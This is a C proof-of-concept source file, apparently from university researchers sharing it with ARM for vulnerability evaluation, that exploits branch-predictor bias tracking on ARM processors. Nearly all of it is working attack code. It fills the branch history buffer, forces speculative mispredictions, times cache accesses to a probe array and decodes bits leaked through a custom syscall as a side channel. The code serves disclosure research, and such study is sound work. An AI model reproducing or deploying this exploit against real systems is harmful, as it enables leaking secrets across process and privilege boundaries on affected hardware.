/*
 * PoC Codes for Bias-Free Branch Predicion Exploitation
 * 
 * Thursday, September 12th 2024
 *
 * Yuhui Zhu - yuhui.zhu@santannapisa.it
 * Alessandro Biondi - alessandro.biondi@santannapisa.it
 *
 * ReTiS Lab, Scuola Superiore Sant'Anna
 * Pisa, Italy
 * 
 * This copy is distributed to ARM for vulnerability evaluation.
 */

#include <unistd.h>
#include <time.h>
#include "utils.h"
#include "jit_snippets.h"
#include "evict_probes.h"
#include "target.h"

#define CACHE_LINE_SIZE (64)
#define CAHCE_PROBE_PTR (2133*CACHE_LINE_SIZE)
#define DEMO_TEST_ROUNDS_CACHE_LAT 128
#define DCAHE_THRESHOLD 220
__attribute__((aligned(4096))) uint8_t probe_array[16384*CACHE_LINE_SIZE];

void do_biasscope();
uint64_t inspect_probes(int idx_probe, jit_bst_entry_blr_t Bx_prime, int i);
void prep_snippets();
void prep_ibhb_populate_patterns();
void print_result();

void *tramp_ret;
uint32_t *offsets_populate_bhb_targets[N_PROBES];
uint32_t offsets_probe_targets[N_PROBES];

__attribute__((aligned(4096)))
void (*func_ptr)();

__attribute__((aligned(4096)))
// Includes an indirect branch that populates the indirect BHB in a for-loop.
jit_populate_bhb_4args_t BH_n;
// Monitor N_PROBES branches on given addresses (defined in offset_probes[]) with one Bx_prime for each.
jit_bst_entry_blr_t Bx_prime[N_PROBES];

__attribute__((aligned(4096)))
uint64_t array_timers[N_PROBES][RECV_MISPRED_TESTS];
uint8_t results[N_PROBES][RECV_ROUNDS];

__attribute__((aligned(4096)))
void __padding00()
{
    NOP(0xa);
}
// Branch target of Bi_pred that increases the VFP_SPEC counter in speculative execution.
void BLR_pred_t_vfp()
{
    MEM_ACCESS(&probe_array[CAHCE_PROBE_PTR]);
    MEM_ACCESS(&probe_array[CAHCE_PROBE_PTR+1]);
    MEM_ACCESS(&probe_array[CAHCE_PROBE_PTR+2]);
    NOP(128);
}
__attribute__((aligned(4096)))
void __padding01()
{
    NOP(0xa);
}
// Branch target of Bi_pred that DOES NOT increase the VFP_SPEC counter in speculative execution.
void BLR_pred_t_empty()
{
    NOP(1);
    NOP(128);
}

// The snippet includes a victim indirect branch.
__attribute__((aligned(4096))) 
void Bi_pred(register void (**func_ptr)())
{
    // BUG: This NOP(32) is ESSENTIAL to amplify the branch latency when a mis-prediction occurs, reason unknown.
    NOP(32);
    (*(*func_ptr))(); // Bi_pred
}

int main()
{
    get_os_params();
    // Create an executable memory that filled by RET ops. These RET ops can be used by indirect branches in BH[n] as branch targets to populate the iBHB.
    tramp_ret = prep_ret_mem(BASE_RET_MEM, 1 << IB_RET_MEM_RANGE, 0, 0, NULL);

    // Deploy BH[n], Bx_prime, and BLR_evict to given addresses.
    prep_snippets();
    NOP_PADDING(16);

    prep_cache_mgmt_invoke_list(tramp_ret, Bx_prime);
    NOP_PADDING(16);
    prep_ibhb_populate_patterns();
    NOP_PADDING(16);

    while (true)
    {
        do_biasscope();
        NOP_PADDING(16);
        print_result();
        fflush(stdout);
        usleep(500 * 1000);
    }
}// BSE_VICTIM_SYSCALL, BSE_V_OPT_LEAK, secret_ptr

// ATTENTION: Avoid extra branches inside the loop, or make them invisible in the branch/path history
void do_biasscope()
{
    for (int i = 0; i < RECV_MISPRED_TESTS; i++)
    {
        // For every RECV_INTERVAL cycles, Setup the non-biased record of all Bx_prime, then yield the CPU to the victim (writer) process.
        if (i % RECV_INTERVAL == 0)
        {
            for (int idx_to_maintain=0; idx_to_maintain<N_PROBES; idx_to_maintain++)
            {
                NOP_PADDING(16);
                // Create the non-biased record for current Bx_prime
                bst_record_create(idx_to_maintain);
                NOP_PADDING(16);
            }
            // Footprints of Bx_prime should be able to be recorded by BHB, yield CPU now.
#ifdef DBG_RECV_FROM_USERSPACE
            usleep(20000);
#else
            syscall(CUST_SYSCALL_BIASSCOPE_SEND, 0b11010110);
#endif
        }

        // Inspect BST records of Bx_prime[].
        for (int idx_probe = 0; idx_probe<N_PROBES; idx_probe++)
        {
            __timer = 0;
            for (int j = 0; j < 32; j++)
            {
                __timer += inspect_probes(idx_probe, Bx_prime[idx_probe], i);
            }
            array_timers[idx_probe][i] = __timer/32;
        }
    }
}

uint64_t inspect_probes(int idx_probe, jit_bst_entry_blr_t Bx_prime, int i)
{
    // === Flow A ===
    populate_cbhb(8);
    BH_n(tramp_ret, offsets_populate_bhb_targets[idx_probe], BHB_LENGTH_PATH_FP_DST, 0);

    func_ptr = &BLR_pred_t_vfp;
    Bi_pred(&func_ptr);
    // ^^^ Flow A ^^^

    MEM_FLUSH_DC_CIVAC(&probe_array[CAHCE_PROBE_PTR]);

    // === Flow B ===
    populate_cbhb(8);
    BH_n(tramp_ret, offsets_populate_bhb_targets[idx_probe], BHB_LENGTH_PATH_FP_DST, 0);
    Bx_prime(RET_MEM_WRITE_IBHB(offsets_probe_targets[idx_probe]));

    func_ptr = &BLR_pred_t_empty;
    FLUSH_TO_RAM_IBPTR();
    Bi_pred(&func_ptr);
    
    return mem_access_time(&probe_array[CAHCE_PROBE_PTR]);
    // ^^^ Flow B ^^^
}

void prep_snippets()
{
    uint64_t offset_align;
    uint64_t length;

    offset_align = JIT_SNIPPET_ALIGN_OFFSET(jit_populate_bhb);
    length = JIT_SNIPPET_LENGTH(jit_populate_bhb);
    BH_n = prep_aligned_snippets(BASE_BHB_POPULATE, OFFSET_BHB_POPULATE, &jit_populate_bhb, offset_align, length, 26, NULL);

    // Mask BLR.addr[3:0] since a BST evictions impacts all branches sharing the the same BP slot.
    offset_align = JIT_SNIPPET_ALIGN_OFFSET(jit_bst_entry_blr);
    length = JIT_SNIPPET_LENGTH(jit_bst_entry_blr);
    for (int i=0; i<N_PROBES; i++)
    {
        Bx_prime[i] = prep_aligned_snippets(BASE_BPU_MAINTAIN, offset_probes[i] & (~0xf), &jit_bst_entry_blr, offset_align, length, BST_IDX_MSB + 1, NULL);
    }
}

/**
 * BUGS, FEATURES, AND WORKAROUNDS
 * 
 * 1. The identifier `Bx_prime` in `inspect_probes()` is an IB POINTER to a Bx_prime snippet being inspected.
 * Invoking `inspect_probes()` with different `Bx_prime` snippets makes the footprint jumping to any `Bx_prime` snippet being recorded.
 * In order to create identical BHB contents for `BLR_pred` in Flow A and `Bx_prime` in Flow B, 
 * `BH_n` should populate the BHB with footprints that are identical with the one comes from the jump to the inspected `Bx_prime` snippet.
 * Also the footprint of `Bx_prime()>BLR` should be different from others to create a different BHB value when it is classified as non-biased. 
*/
void prep_ibhb_populate_patterns()
{
    for (int idx_probe = 0; idx_probe < N_PROBES; idx_probe++)
    {
        uint64_t base_probe = (uint64_t)Bx_prime[idx_probe];
        int64_t footprint_blr_to_probe = (base_probe & PATH_FP_DST_MASK) >> PATH_FP_DST_LSH;
        offsets_populate_bhb_targets[idx_probe] = prep_fp_offsets(PATH_FP_DST_MASK, footprint_blr_to_probe, PATH_FP_DST_LSH, 4, NULL);
        offsets_probe_targets[idx_probe] = footprint_blr_to_probe + 1;
    }
}

void decode_side_ch()
{
    for (int idx_probe = 0; idx_probe < N_PROBES; idx_probe++)
    {
        for (int idx_recv = 0; idx_recv < RECV_ROUNDS; idx_recv++)
        {
            uint64_t __sum = 0;
            for (int idx_mispred_test = 0; idx_mispred_test < RECV_INTERVAL; idx_mispred_test++)
            {
                __sum += array_timers[idx_probe][idx_recv * RECV_INTERVAL + idx_mispred_test];
            }
            __sum = __sum/RECV_INTERVAL;
            results[idx_probe][idx_recv] = (__sum < DCAHE_THRESHOLD) ? 1 : 0;
        }
    }
}

// __attribute__((aligned(1<<16))) 
void print_result()
{
    decode_side_ch();

    for (int idx_recv = 0; idx_recv < RECV_ROUNDS; idx_recv++)
    {
        for (int idx_probe = 0; idx_probe < N_PROBES; idx_probe++)
        {
            printf("%d", results[idx_probe][idx_recv]);
        }
        printf("\n");
    }
    printf("\n");

#ifdef DBG_PRINT_LATENCY_PROBE
    printf("Branch latency with Bx_prime[%d]\n", DBG_PRINT_LATENCY_PROBE);
    for (int i = 0; i < RECV_MISPRED_TESTS; i++)
    {
        printf("%3d  ", array_timers[DBG_PRINT_LATENCY_PROBE][i]);
        if (i % 4 == 3)
            printf("  ");
        if (i % 16 == 15)
            printf("\n");
        if (i % (RECV_INTERVAL) == (RECV_INTERVAL - 1))
            printf("\n");
    }
    printf("\n");
#endif
}
